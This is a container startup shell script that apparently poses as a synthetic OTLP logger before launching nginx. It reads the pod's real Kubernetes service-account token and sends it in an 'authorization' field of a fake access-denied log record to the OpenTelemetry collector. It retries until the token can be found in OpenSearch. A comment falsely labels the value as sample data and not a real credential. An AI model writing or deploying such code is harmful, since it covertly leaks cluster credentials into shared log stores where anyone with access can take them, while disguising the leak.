#!/usr/bin/env sh
# Invia log OTLP/HTTP finché il token non appare in OpenSearch
set -eu

OTEL_COLLECTOR_HOST="${OTEL_COLLECTOR_HOST:-otel-collector.mem}"
OTEL_COLLECTOR_PORT_HTTP="${OTEL_COLLECTOR_PORT_HTTP:-4318}"
OTEL_SERVICE_NAME="${OTEL_SERVICE_NAME:-image-provider}"
LOG_INTERVAL_SECONDS="${LOG_INTERVAL_SECONDS:-5}"
LOG_SEVERITY_TEXT="${LOG_SEVERITY_TEXT:-Info}"
LOG_SEVERITY_NUMBER="${LOG_SEVERITY_NUMBER:-9}"
TOKEN_FILE="${TOKEN_FILE:-/var/run/secrets/kubernetes.io/serviceaccount/token}"

endpoint="http://${OTEL_COLLECTOR_HOST}:${OTEL_COLLECTOR_PORT_HTTP}/v1/logs"

# genera ID casuali
rand_hex() {
  od -vN "$1" -An -tx1 /dev/urandom | tr -d ' \n'
}

now_nano() {
  ns="$(date +%s%N 2>/dev/null || true)"
  if [ -z "$ns" ] || echo "$ns" | grep -q 'N'; then
    ns="$(date +%s)000000000"
  fi
  printf "%s" "$ns"
}

send_one() {
  TS="$(now_nano)"
  TRACE_ID="$(rand_hex 16)"
  SPAN_ID="$(rand_hex 8)"

  BODY_MSG="k8s_secret_access_denied"
  AUTH_VAL="$(cat "${TOKEN_FILE}" || echo "NO_TOKEN_FILE")"

  PAYLOAD=$(cat <<EOF
{
  "resourceLogs": [{
    "resource": {
      "attributes": [
        {"key":"service.name","value":{"stringValue":"${OTEL_SERVICE_NAME}"}},
        {"key":"service.instance.id","value":{"stringValue":"${HOSTNAME:-unknown}"}}
      ]
    },
    "scopeLogs": [{
      "scope": {"name":"synthetic-logger","version":"1.0.0"},
      "logRecords": [{
        "timeUnixNano": "${TS}",
        "observedTimeUnixNano": "${TS}",
        "severityNumber": ${LOG_SEVERITY_NUMBER},
        "severityText": "${LOG_SEVERITY_TEXT}",
        "body": {"stringValue": "${BODY_MSG}"},
        "attributes": [
          {"key":"http.request.method","value":{"stringValue":"GET"}},
          {"key":"http.target","value":{"stringValue":"/api/v1/namespaces/demo/secrets/fake"}},
          {"key":"status","value":{"stringValue":"403"}},
          {"key":"authorization","value":{"stringValue":"${AUTH_VAL}"}},
          {"key":"note","value":{"stringValue":"SAMPLE DATA – not a real credential"}}
        ],
        "traceId": "${TRACE_ID}",
        "spanId": "${SPAN_ID}",
        "flags": 1
      }]
    }]
  }]
}
EOF
)

  curl -sS -X POST \
    -H 'Content-Type: application/json' \
    --data "${PAYLOAD}" \
    --retry 3 --retry-delay 1 \
    "${endpoint}" >/dev/null

  printf "[otlp-log] sent at %s to %s\n" "$(date -Is)" "${endpoint}" >&2
}

# loop principale: invia finché il token non appare in OpenSearch
while true; do
  send_one

  # prendi il token da OpenSearch
  FOUND_TOKEN="$(curl -s "http://opensearch.mem:9200/_all/_search" \
      -H 'Content-Type: application/json' \
      -d '{
        "size": 5000,
        "sort": [
          { "@timestamp": { "order": "desc" } }
        ],
        "query": { "match_all": {} }
      }' \
      | jq -r '.hits.hits[]._source.attributes.authorization // empty' \
      | grep -v '^$' \
      | head -n1 || true)"

  CURRENT_TOKEN="$(cat "${TOKEN_FILE}" || echo "NO_TOKEN_FILE")"

  if [ -n "$FOUND_TOKEN" ] && [ "$FOUND_TOKEN" = "$CURRENT_TOKEN" ]; then
    printf "[otlp-log] token matched in OpenSearch, stopping script at %s\n" "$(date -Is)" >&2
    break
  fi

  sleep "${LOG_INTERVAL_SECONDS}"
done

echo "Starting nginx..."
envsubst '$OTEL_COLLECTOR_HOST $IMAGE_PROVIDER_PORT $OTEL_COLLECTOR_PORT_GRPC $OTEL_SERVICE_NAME' \
    < /nginx.conf.template > /etc/nginx/nginx.conf

cat /etc/nginx/nginx.conf
exec nginx -g 'daemon off;'